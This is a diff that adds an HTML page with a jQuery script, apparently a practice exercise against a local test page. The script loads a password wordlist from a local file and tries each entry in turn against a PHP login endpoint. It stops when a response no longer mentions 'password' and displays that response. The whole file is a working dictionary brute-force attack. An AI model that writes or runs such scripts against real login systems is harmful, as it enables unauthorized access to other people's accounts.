@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title>Document</title>
+</head>
+<body>
+	<div id="toto"></div>
+	<script src="jquery-3.2.1.js"></script>
+	<script>
+		var passwords = [];
+
+		$.ajax({
+			type:'GET',
+			url: '../data/dico.txt',
+			success: function(data){
+				passwords = data.split("\n");
+				bruteForce(passwords, passwords.length -1);
+			}
+		});
+
+		function bruteForce(array, i){
+
+			$.ajax({
+				type: 'GET',
+				url: '../bruteforce/index.php',
+				data: 'password=' + array[i],
+				success: function(data){
+					$('#toto').text(array[i]);
+					if (!/password/.test(data)){
+						console.log(data);
+						$('#toto').html(data);
+					} else {
+						bruteForce(array, --i);
+					}
+
+				},
+				error: function(){
+					console.log('Ca marche passsss!!!');
+				}
+			});
+		}
+
+	</script>
+</body>
+</html>
